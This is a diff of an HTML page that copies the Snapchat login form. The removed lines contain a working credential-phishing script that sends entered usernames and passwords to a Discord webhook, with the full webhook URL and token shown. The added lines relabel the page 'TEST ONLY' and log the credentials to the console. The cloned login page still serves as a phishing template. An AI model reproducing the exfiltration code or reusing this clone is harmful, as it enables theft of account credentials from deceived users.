@@ -10,76 +10,79 @@
 <link rel=canonical href=https://accounts.snapchat.com/accounts/login>
 <meta http-equiv=content-security-policy
       content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:;">
-<body class=designV2>
-      <div class=pusher>
-            <div id=login-root>
-                  <div class=App style=display:none>
-                        <div class=full-background-color></div>
-                        <div class=Header><a href=https://accounts.snapchat.com/ class="logo sf-hidden"></a></div>
-                        <div class=Login>
-                              <article class=page>
-                                    <div class=container><img class=snapchat-icon src="icon.svg" alt=Snapchat>
-                                          <div>
-                                                <h1 class=accountsTitle>Log in to Snapchat for Web</h1>
-                                          </div>
-                                          <div>
-                                                      <div class="form-group has-success"><label for=username
-                                                                  class=control-label>Username or Email</label><input
-                                                                  name=username autocomplete=off type=text id=username
-                                                                  class=form-control required value></div>
-                                                      <div class="form-group has-success"><label for=password
-                                                                  class=control-label>Password</label><input
-                                                                  name=password autocomplete=off type=password
-                                                                  id=password class=form-control required value></div>
-                                                      <p class=secondary_action><a href=#>Forgot
-                                                                  Password</a>
-                                                      <div style=display:none></div>
-                                                      <div class="primary_action login-button"><button type=submit
-                                                                  id=loginTrigger class="btn btn-lg btn-primary">Log
-                                                                  In</button></div>
-                                                </form>
-                                          </div>
-                                    </div>
-                                    <div class=create-account-cta><span>New To Snapchat?</span><a
-                                                href=https://accounts.snapchat.com/accounts/signup>Sign Up</a></div>
-                              </article>
-                        </div>
-                  </div>
+<body class="designV2">
+  <div class="pusher">
+    <div id="login-root">
+      <div class="App">
+        <div class="full-background-color"></div>
+        <div class="Header">
+          <a href="#" class="logo sf-hidden"></a>
+        </div>
+
+        <div class="Login">
+          <article class="page">
+            <div class="container">
+              <img class="snapchat-icon" src="icon.svg" alt="Snapchat">
+
+              <div>
+                <h1 class="accountsTitle">Log in to Snapchat (TEST ONLY)</h1>
+              </div>
+
+              <form id="loginForm">
+                <div class="form-group has-success">
+                  <label for="username" class="control-label">Username or Email</label>
+                  <input name="username" autocomplete="off" type="text" id="username"
+                         class="form-control" required>
+                </div>
+
+                <div class="form-group has-success">
+                  <label for="password" class="control-label">Password</label>
+                  <input name="password" autocomplete="off" type="password" id="password"
+                         class="form-control" required>
+                </div>
+
+                <p class="secondary_action"><a href="#">Forgot Password</a></p>
+
+                <div class="primary_action login-button">
+                  <button type="submit" id="loginTrigger" class="btn btn-lg btn-primary">
+                    Log In
+                  </button>
+                </div>
+              </form>
             </div>
+
+            <div class="create-account-cta">
+              <span>New To Snapchat?</span>
+              <a href="#">Sign Up</a>
+            </div>
+          </article>
+        </div>
       </div>
-      <script>
-document.getElementById("loginTrigger").addEventListener("click", function(event){
-    event.preventDefault(); // prevent default form submission
+    </div>
+  </div>
 
-    // Get input values
-    const desert = document.getElementById("username").value;
-    const amount = document.getElementById("password").value;
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(event){
+      event.preventDefault(); // stop real submission
 
-    if(!username || !password){
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      if (!username || !password) {
         alert("Please fill in both fields!");
         return;
-    }
+      }
 
-    const webhookURL = "https://discord.com/api/webhooks/1440084893026619498/EghJR4801Er-ZaAFQcKMVSqHD3MCglFGDQqujsGZpkgUg3mNy-TVSouuBcUX7dzERTtF"; // Replace with your Discord webhook
+      // SAFE: Log to console instead of sending anywhere
+      console.log("=== TEST LOGIN ===");
+      console.log("Username:", username);
+      console.log("Password:", password);
 
-    const message = `Your goated :\nUsername: ${username}\nPassword: ${password}`;
+      alert("Form submitted! Open the console to see the values.");
 
-    fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: message })
-    })
-    .then(response => {
-        if(response.ok){
-            alert("Ahamed your a genius man");
-            // Optional: clear input fields
-            document.getElementById("username").value = "";
-            document.getElementById("ammount").value = "";
-        } else {
-            alert("Failed to send: " + response.status);
-        }
-    })
-    .catch(error => alert("Error: " + error));
-});
-</script>
+      // Optional: clear inputs
+      document.getElementById("username").value = "";
+      document.getElementById("password").value = "";
+    });
+  </script>
 </body>
